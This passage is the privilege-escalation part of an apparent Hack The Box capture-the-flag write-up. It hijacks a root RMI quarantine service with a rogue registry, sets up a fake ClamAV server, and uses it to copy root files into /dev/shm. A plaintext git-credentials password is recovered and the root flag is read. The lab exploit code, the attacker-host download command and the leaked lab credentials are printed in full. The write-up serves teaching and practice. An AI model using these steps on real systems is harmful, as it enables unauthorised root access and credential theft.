<span class="code-blue">CMD: UID=0    PID=23958  | /bin/sh -c systemctl restart registry.service</span>
<span class="code-blue">CMD: UID=0    PID=23957  | /usr/sbin/CRON -f</span>
<span class="code-blue">CMD: UID=0    PID=23956  | /usr/sbin/CRON -f</span>
<span class="code-blue">CMD: UID=0    PID=23955  | /usr/sbin/CRON -f</span>
<span class="code-blue">CMD: UID=0    PID=23965  | sleep 10</span>
<span class="code-blue">CMD: UID=0    PID=23964  | /bin/bash /root/tomcat-app/reset.sh</span>
<span class="code-blue">CMD: UID=0    PID=23963  | /bin/sh -c for i in {1..6}; do /bin/bash /root/tomcat-app/reset.sh & sleep 10; done</span>
<span class="code-blue">CMD: UID=0    PID=23961  | /bin/sh -c /bin/bash /root/check-vhosts.sh</span>
<span class="code-blue">CMD: UID=0    PID=23966  | /bin/bash /root/check-vhosts.sh</span>
<span class="code-blue">CMD: UID=0    PID=23968  | /usr/local/sbin/vhosts-manage -m quarantine</span>
<span class="code-blue">CMD: UID=0    PID=23967  | /bin/bash /root/tomcat-app/reset.sh</span>
<span class="code-blue">CMD: UID=0    PID=23972  | /usr/bin/java -jar /usr/share/vhost-manage/includes/quarantine.jar</span>
<span class="code-blue">CMD: UID=0    PID=23974  | /bin/bash /root/tomcat-app/reset.sh</span>
<span class="code-blue">CMD: UID=0    PID=23997  | runc --root /var/run/docker/runtime-runc/moby --log /run/containerd/io.containerd.runtime.v2.task/moby/b78dfd4ba83d3367349e0c5e2b8004198f2d24db33f457e3656eca5443e0448d/log.json --log-format json exec --process /tmp/runc-process1633812451 --console-socket /tmp/pty2941058999/pty.sock --detach --pid-file /run/containerd/io.containerd.runtime.v2.task/moby/b78dfd4ba83d3367349e0c5e2b8004198f2d24db33f457e3656eca5443e0448d/27f1f86d66bfccf902071c0126ffcb9c3c4f62388f5ad386bfdebd1ccc6c6130.pid b78dfd4ba83d3367349e0c5e2b8004198f2d24db33f457e3656eca5443e0448d</span>  
<span class="code-blue">CMD: UID=0    PID=24005  | runc init</span>
<span class="code-blue">CMD: UID=0    PID=24007  | runc init</span>
<span class="code-blue">CMD: UID=0    PID=24024  | /lib/systemd/systemd-udevd</span>
<span class="code-blue">CMD: UID=0    PID=24023  | /lib/systemd/systemd-udevd</span>
<span class="code-blue">CMD: UID=0    PID=24022  | /lib/systemd/systemd-udevd</span>
<span class="code-blue">CMD: UID=0    PID=24021  | /lib/systemd/systemd-udevd</span>
<span class="code-blue">CMD: UID=0    PID=24020  | /lib/systemd/systemd-udevd</span>
<span class="code-blue">CMD: UID=0    PID=24019  | /lib/systemd/systemd-udevd</span>
<span class="code-blue">CMD: UID=0    PID=24018  | /lib/systemd/systemd-udevd</span>
<span class="code-blue">CMD: UID=0    PID=24017  | /lib/systemd/systemd-udevd</span>
<span class="code-blue">CMD: UID=0    PID=24016  | /lib/systemd/systemd-udevd</span>
<span class="code-red">CMD: UID=999  PID=24015  | /usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar /opt/registry.jar</span>
<span class="code-blue">CMD: UID=0    PID=24031  |</span>
<span class="code-blue">CMD: UID=0    PID=24032  | /lib/systemd/systemd-udevd
</code></pre></div><p>Here we have a small time window to execute our malicious RMI registry on port 9002, so that the legitimate <code>registry.jar</code> is no longer able to listen on that port. As a result, <code>quarantine.jar</code> will connect to our RMI registry and we will be able to set an arbitrary configuration for ClamAV.</p><p>For instance, what we will do is actually set the ClamAV host to our attacker machine IP address, the quarantine directory to <code>/dev/shm</code> (which is accessible by everyone) and the directory to scan will be <code>/root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">quarantine</span><span class="mtk1">;</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">io</span><span class="mtk5">.</span><span class="mtk8 mtku">File</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">RemoteException</span><span class="mtk1">;</span>

<span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">QuarantineServiceImpl</span> <span class="mtk5">implements</span><span class="mtk1"> </span><span class="mtk8 mtku">QuarantineService</span><span class="mtk1"> {</span>
<span class="mtk1">    @</span><span class="mtk8 mtku">Override</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk8 mtku">QuarantineConfiguration</span><span class="mtk1"> </span><span class="mtk8">getConfiguration</span><span class="mtk1">() </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">RemoteException</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk5">return</span> <span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">QuarantineConfiguration</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">File</span><span class="mtk1">(</span><span class="mtk4">"/dev/shm"</span><span class="mtk1">), </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">File</span><span class="mtk1">(</span><span class="mtk4">"/root"</span><span class="mtk1">), </span><span class="mtk4">"10.10.17.44"</span><span class="mtk1">, </span><span class="mtk6">3310</span><span class="mtk1">, </span><span class="mtk6">1000</span><span class="mtk1">);</span>  
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>This time, we have Java 17 on the machine:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@registry</span>:<span class="code-blue">/tmp</span>$ java -version
openjdk version "17.0.7" 2023-04-18
OpenJDK Runtime Environment (build 17.0.7+7-Ubuntu-0ubuntu118.04)
OpenJDK 64-Bit Server VM (build 17.0.7+7-Ubuntu-0ubuntu118.04, mixed mode, sharing)  
</code></pre></div><p>So, let&rsquo;s use another Docker container with this specific version of Java to compile the JAR file (which is actually a ZIP archive):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tree</span>
.
├── com
│   └── htb
│       └── hosting
│           └── rmi
│               ├── quarantine
│               │   ├── QuarantineConfiguration.java
│               │   ├── QuarantineServiceImpl.java
│               │   └── QuarantineService.java
│               └── Server.java
└── META-INF
    └── MANIFEST.MF

6 directories, 5 files

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">META-INF/MANIFEST.MF</span>
Main-Class: com.htb.hosting.rmi.Server

<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -it --rm -v <span class="code-dark-yellow">"<span class="code-dark-cyan">$PWD</span>:/home/rocky"</span> openjdk:17 bash
Unable to find image 'openjdk:17' locally
17: Pulling from library/openjdk
38a980f2cc8a: Pull complete
de849f1cfbe6: Pull complete
a7203ca35e75: Pull complete
Digest: sha256:528707081fdb9562eb819128a9f85ae7fe000e2fbaeaf9f87662e7b3f38cb7d8
Status: Downloaded newer image for openjdk:17
bash-4.4# cd /home/rocky/
bash-4.4# javac com/htb/hosting/rmi/Server.java
bash-4.4# javac com/htb/hosting/rmi/quarantine/*.java
bash-4.4# exit
exit

<span class="code-cyan">$</span> <span class="code-dark-green">zip</span> -r registry.jar <span class="mtku">META-INF</span> <span class="mtku">com/htb/hosting/rmi/Server.class</span> com/htb/hosting/rmi/quarantine/<span class="code-dark-blue">*</span>.class  
  adding: META-INF/ (stored 0%)
  adding: META-INF/MANIFEST.MF (stored 0%)
  adding: com/htb/hosting/rmi/Server.class (deflated 45%)
  adding: com/htb/hosting/rmi/quarantine/QuarantineConfiguration.class (deflated 50%)
  adding: com/htb/hosting/rmi/quarantine/QuarantineService.class (deflated 37%)
  adding: com/htb/hosting/rmi/quarantine/QuarantineServiceImpl.class (deflated 44%)
</code></pre></div><p>Now we are ready to upload the JAR file to the machine and exploit the &ldquo;race condition&rdquo; to take ownership of port 9002 with our RMI registry:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@registry</span>:<span class="code-blue">/tmp</span>$ wget -qO .registry.jar 10.10.17.44:8000/registry.jar
<span class="code-green">developer@registry</span>:<span class="code-blue">/tmp</span>$ java -jar .registry.jar
Exception in thread "main" java.rmi.server.ExportException: Port already in use: 9002; nested exception is:
        java.net.BindException: Address already in use
        at java.rmi/sun.rmi.transport.tcp.TCPTransport.listen(TCPTransport.java:346)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport.exportObject(TCPTransport.java:243)
        at java.rmi/sun.rmi.transport.tcp.TCPEndpoint.exportObject(TCPEndpoint.java:415)
        at java.rmi/sun.rmi.transport.LiveRef.exportObject(LiveRef.java:147)
        at java.rmi/sun.rmi.server.UnicastServerRef.exportObject(UnicastServerRef.java:235)
        at java.rmi/sun.rmi.registry.RegistryImpl.setup(RegistryImpl.java:223)
        at java.rmi/sun.rmi.registry.RegistryImpl.&lt;init&gt;(RegistryImpl.java:208)
        at java.rmi/java.rmi.registry.LocateRegistry.createRegistry(LocateRegistry.java:203)
        at com.htb.hosting.rmi.Server.main(Server.java:14)
Caused by: java.net.BindException: Address already in use
        at java.base/sun.nio.ch.Net.bind0(Native Method)
        at java.base/sun.nio.ch.Net.bind(Net.java:555)
        at java.base/sun.nio.ch.Net.bind(Net.java:544)
        at java.base/sun.nio.ch.NioSocketImpl.bind(NioSocketImpl.java:643)
        at java.base/java.net.ServerSocket.bind(ServerSocket.java:388)
        at java.base/java.net.ServerSocket.&lt;init&gt;(ServerSocket.java:274)
        at java.base/java.net.ServerSocket.&lt;init&gt;(ServerSocket.java:167)
        at java.rmi/sun.rmi.transport.tcp.TCPDirectSocketFactory.createServerSocket(TCPDirectSocketFactory.java:45)  
        at java.rmi/sun.rmi.transport.tcp.TCPEndpoint.newServerSocket(TCPEndpoint.java:673)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport.listen(TCPTransport.java:335)
        ... 8 more
<span class="code-green">developer@registry</span>:<span class="code-blue">/tmp</span>$ while true; do java -jar .registry.jar 2&gt;/dev/null; done
[+] Bound to 9002
</code></pre></div><p>Now we can fake a ClamAV server, and the files that will be analyzed are inside <code>/root</code>. If we tell that those scanned files are malicious, they will be quarantined at <code>/dev/shm</code>. Let&rsquo;s use <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 3310
Listening on 0.0.0.0 3310
Connection received on 10.10.11.223 58580  
zSCAN /root/.docker/buildx/.lock
</code></pre></div><p>The problem is that <code>nc</code> closes the connection. Instead, let&rsquo;s script a simple socket server with Python and send always <code>FOUND</code> to tell that the file is malicious:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">socketserver</span>

<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">MyTCPHandler</span><span class="mtk1">(</span><span class="mtk8 mtku">socketserver</span><span class="mtk1">.</span><span class="mtk8 mtku">BaseRequestHandler</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">handle</span><span class="mtk1">(</span><span class="mtk9 mtki">self</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">request</span><span class="mtk1">.recv(</span><span class="mtk6">1024</span><span class="mtk1">).strip()</span>
<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">data</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">request</span><span class="mtk1">.sendall(</span><span class="mtk7 mtki">b</span><span class="mtk4">'filename: asdf FOUND</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk8 mtku">socketserver</span><span class="mtk1">.</span><span class="mtk8 mtku">TCPServer</span><span class="mtk1">((</span><span class="mtk4">'0.0.0.0'</span><span class="mtk1">, </span><span class="mtk6">3310</span><span class="mtk1">), </span><span class="mtk8 mtku">MyTCPHandler</span><span class="mtk1">) </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">server</span><span class="mtk1">:</span>  
<span class="mtk1">    </span><span class="mtk1">server</span><span class="mtk1">.</span><span class="mtk8">serve_forever</span><span class="mtk1">()</span>
</code></pre></div><p>The responses of ClamAV can be found in the <a target="_blank" href="https://kalinel.com/wp-content/uploads/2015/01/clamdoc.pdf">documentation</a> (page 19).</p><p>After a bit of time, the machine will start using <code>zSCAN</code> with all the files inside <code>/root</code> and saving them to <code>/dev/shm</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">socket_server.py</span>
b'zSCAN /root/.docker/buildx/.lock\x00'
b'zSCAN /root/.docker/buildx/current\x00'
b'zSCAN /root/.docker/.buildNodeID\x00'
b'zSCAN /root/.docker/.token_seed.lock\x00'
b'zSCAN /root/.docker/config.json\x00'
b'zSCAN /root/.docker/.token_seed\x00'
b'zSCAN /root/.lesshst\x00'
b'zSCAN /root/check-vhosts.sh\x00'
b'zSCAN /root/.cache/motd.legal-displayed\x00'
b'zSCAN /root/docker-compose-reg.yml\x00'
b'zSCAN /root/.ssh/id_rsa\x00'
b'zSCAN /root/.ssh/authorized_keys\x00'
b'zSCAN /root/.ssh/id_rsa.pub\x00'
b'zSCAN /root/root.txt\x00'
b'zSCAN /root/nginx/default\x00'
b'zSCAN /root/.git-credentials\x00'
b'zSCAN /root/tomcat-app/context.xml\x00'
b'zSCAN /root/tomcat-app/Dockerfile\x00'
b'zSCAN /root/tomcat-app/reset.sh\x00'
b'zSCAN /root/tomcat-app/src-1.0-SNAPSHOT.war\x00'
b'zSCAN /root/tomcat-app/docker-compose.yml\x00'
b'zSCAN /root/tomcat-app/dump.sql\x00'
b'zSCAN /root/tomcat-app/hosting.ini\x00'
b'zSCAN /root/tomcat-app/hosting-default.ini\x00'
b'zSCAN /root/.httpie/config.json\x00'
b'zSCAN /root/docker-registry/docker-compose.yml\x00'
b'zSCAN /root/docker-registry/data/docker/registry/v2/blobs/sha256/9d/9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c/data\x00'  
b'zSCAN /root/docker-registry/data/docker/registry/v2/blobs/sha256/9d/9d19db0eb2360b76dee4b470a975323f5f6cc4905f8f90f65f63d757340907e9/data\x00'
b'zSCAN /root/docker-registry/data/docker/registry/v2/blobs/sha256/1a/1acc6f88f783bd069013a54361591a56b7b1b8701596a96c12c63b673a280319/data\x00'
...
</code></pre></div><p>There are a lot of interesting files. As before, probably we can find a plaintext password in <code>.git-credentials</code>. Let&rsquo;s find the file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@registry</span>:<span class="code-blue">/tmp</span>$ find /dev/shm -name \*git-credentials\*
/dev/shm/quarantine-run-2023-07-27T20:28:07.111587112/_root_.git-credentials  
/dev/shm/quarantine-run-2023-07-27T20:27:06.809494181/_root_.git-credentials
/dev/shm/quarantine-run-2023-07-27T20:26:07.118229480/_root_.git-credentials
</code></pre></div><p>Great, and there it is, now we are <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@registry</span>:<span class="code-blue">/tmp</span>$ cat /dev/shm/quarantine-run-2023-07-27T20:28:07.111587112/_root_.git-credentials  
https://admin:52nWqz3tejiImlbsihtV@github.com
<span class="code-green">developer@registry</span>:<span class="code-blue">/tmp</span>$ su root
Password:
root@registry:/tmp# cd
root@registry:~# cat root.txt
e4408c4688226b2e482959f1e73f9549
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#docker-registry">Docker registry</a></li><li><a href="#war-decompilation">WAR decompilation</a></li></ul></li><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#tomcat-and-nginx-exploitation">Tomcat and nginx exploitation</a></li></ul></li><li><a href="#rmi-exploitation">RMI exploitation</a></li><li><a href="#foothold">Foothold</a></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>